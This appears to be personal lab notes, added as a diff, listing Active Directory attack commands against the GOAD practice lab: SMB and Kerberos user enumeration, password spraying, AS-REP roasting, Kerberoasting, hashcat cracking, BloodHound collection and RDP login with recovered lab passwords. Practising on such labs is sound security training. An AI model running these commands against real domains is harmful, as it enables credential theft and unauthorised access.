@@ -1,0 +1,40 @@
+SETTING /etc/hosts
+# GOAD
+192.168.56.10   sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding
+192.168.56.11   winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell
+192.168.56.22   castelblack.north.sevenkingdoms.local castelblack
+
+
+RECONN
+crackmapexec smb 192.168.56.1/24
+crackmapexec smb 192.168.56.11 --users
+crackmapexec smb 192.168.56.11 -u '' -p '' --users
+crackmapexec smb 192.168.56.10-23 -u 'a' -p '' --shares
+crackmapexec smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce
+
+enum4linux 192.168.56.11
+nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='essos.local',userdb=got_users.txt" 192.168.56.12
+rpcclient -U "NORTH\\" 192.168.56.11 -N
+enumdomusers
+enumdomgroups
+net rpc group members 'Domain Users' -W 'NORTH' -I '192.168.56.11' -U '%'
+
+
+nmap -Pn -p- -sC -sV -oA full_scan_goad 192.168.56.10
+
+ASREP - roasting
+impacket-GetNPUsers north.sevenkingdoms.local/ -no-pass -usersfile users-north.txt
+hashcat -O -w 1 -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt
+
+GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople 
+
+impacket-GetADUsers -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople
+impacket-GetUserSPNs -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
+hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
+crackmapexec smb 192.168.56.10-23 -u jon.snow -p iknownothing -d north.sevenkingdoms.local --shares                            
+
+nxc ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting KERBEROASTING
+
+bloodhound-python --zip -c All -d north.sevenkingdoms.local -u brandon.stark -p iseedeadpeople -dc winterfell.north.sevenkingdoms.local -ns 192.168.56.11
+bloodhound-python --zip -c All -d sevenkingdoms.local -u brandon.stark@north.sevenkingdoms.local -p iseedeadpeople -dc kingslanding.sevenkingdoms.local -ns 192.168.56.10
+xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert:ignore
